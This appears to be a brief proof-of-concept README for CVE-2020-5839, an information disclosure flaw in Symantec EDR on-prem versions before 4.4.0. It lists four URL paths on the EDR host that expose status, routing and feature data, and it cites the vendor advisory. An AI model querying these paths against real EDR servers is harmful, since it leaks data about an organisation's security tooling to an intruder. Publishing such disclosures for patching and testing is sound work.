# CVE-2020-5839
CVE-2020-5839 POC

Symantec EDR on-prem version prior to "4.4.0" is prone to an information disclosure vulnerability via the following URL's :

```
https://@IP_EDR/r3_epmp_i/status/
https://@IP_EDR/r3_epmp_i/status/routes
https://@IP_EDR/r3_epmp_i/v1/event/status/ds
https://@IP_EDR/atpapp/features/list
```

### Reference 

* https://support.broadcom.com/security-advisory/content/security-advisories/SEDR-Information-Disclosure/SYMSA16090
